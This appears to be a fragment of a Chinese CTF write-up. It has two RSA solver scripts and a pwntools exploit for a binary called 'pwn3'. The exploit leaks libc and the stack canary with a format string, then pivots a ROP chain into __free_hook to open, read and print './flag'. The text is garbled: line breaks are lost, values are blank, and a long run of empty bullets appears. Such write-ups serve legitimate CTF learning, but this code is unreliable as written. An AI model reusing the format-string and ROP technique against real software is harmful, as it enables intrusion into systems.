```
#coding:utf-8import gmpy2from Crypto.Util.number import *
*q*r
primes = [dp, dq, dr]phi_n = [(q - 1) * (r - 1), (p - 1) * (r - 1), (p - 1) * (q - 1)]
d = crt(primes, phi_n)
m = pow(c, d, n)print(long_to_bytes(m))
```

```
# coding:utf-8from Crypto.Util.number import long_to_bytesimport libnumimport gmpy2
def egcd(a, b):    if a == 0:        return b, 0, 1    else:        g, y, x = egcd(b % a, a)        return g, x - b // a * y, ydef main():    n =     e1 = 1694283    e2 = 1589937    c1 =     c2 =     s = egcd(e1//3, e2//3)    s1 = s[1]    s2 = s[2]    # 求模反元素    if s1 < 0:        s1 = -s1        c1 = gmpy2.invert(c1, n)    elif s2 < 0:        s2 = -s2        c2 = gmpy2.invert(c2, n)    m = pow(c1, s1, n) * pow(c2, s2, n) % n    m=gmpy2.iroot(m,3)    print m    # print(long_to_bytes('13040004482825156860395157624819040851050261866880924188457925556421111415369843947863093885'))if __name__ == '__main__':    main()
```

这题还禁用了exevce函数

思路:

格式化字符串泄露 libc

通过rop实现栈迁移将orw写入到\_\_free\_hook中，从而获得flag.

exp：

*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   

```
#coding:utf8from pwn import *context.log_level="debug"p=process("./pwn3")elf=ELF("./pwn3")libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
p.recvuntil("$ ")p.sendline("login")p.recvuntil("user:")p.sendline("%107$p##%11$p")p.recvuntil("0x")libc_base=int(p.recv(12),16)print "libc_base : "+hex(libc_base)libc_base=libc_base-243-libc.sym['__libc_start_main']print "libc_base : "+hex(libc_base) p.recvuntil("##0x")canary=int(p.recv(16),16)print "canary : "+hex(canary) p.recvuntil("passwd:")sys_addr = libc_base+libc.symbols['system']sh_addr = libc_base+libc.search('/bin/sh').next()pop_rdi_ret = libc_base+0x26b72
print "sys_addr : "+hex(sys_addr) print "sh_addr : "+hex(sh_addr) print "pop_rdi_ret : "+hex(pop_rdi_ret) print "one : "+hex(libc_base+0xe6c7e) 
open_addr=libc_base+libc.symbols['open']read_addr=libc_base+libc.symbols['read']puts_addr=libc_base+libc.symbols['puts']
__free_hook=libc_base+libc.symbols['__free_hook']pop_rdx_ret=libc_base+0x11c371      #0x000000000011c371: pop rdx; pop r12; ret;pop_rsi_ret=libc_base+0x27529leave_ret=libc_base+0x5aa48 
print "open_addr is "+hex(open_addr)print "read_addr is "+hex(read_addr)print "free_hook is "+hex(__free_hook)
print "pop_rdi_ret is "+hex(pop_rdi_ret)print "pop_rdi_ret is "+hex(pop_rdi_ret)print "pop_rsi_ret is "+hex(pop_rsi_ret)print "leave_ret is "+hex(leave_ret)
pd='a'*0x18+p64(canary)+p64(__free_hook)pd+=p64(pop_rsi_ret)+p64(__free_hook+0x8)+p64(pop_rdi_ret)+p64(0)+p64(pop_rdx_ret)+p64(0x100)+p64(0)+p64(read_addr)+p64(leave_ret)
p.send(pd)
pd=p64(pop_rdi_ret)+p64(__free_hook+0xa0)+p64(pop_rsi_ret)+p64(0)+p64(pop_rdx_ret)+p64(0x0)+p64(0)+p64(open_addr) ##open("file_addr",oflag) 72 0pd+=p64(pop_rsi_ret)+p64(__free_hook+0x100)+p64(pop_rdi_ret)+p64(3)+p64(pop_rdx_ret)+p64(0x100)+p64(0)+p64(read_addr)#read(fd,*buf,100)pd+=p64(pop_rdi_ret)+p64(__free_hook+0x100)+p64(puts_addr)#puts()pd+="./flag\x00"p.send(pd)print "len=>",hex(len(pd))p.interactive()
```
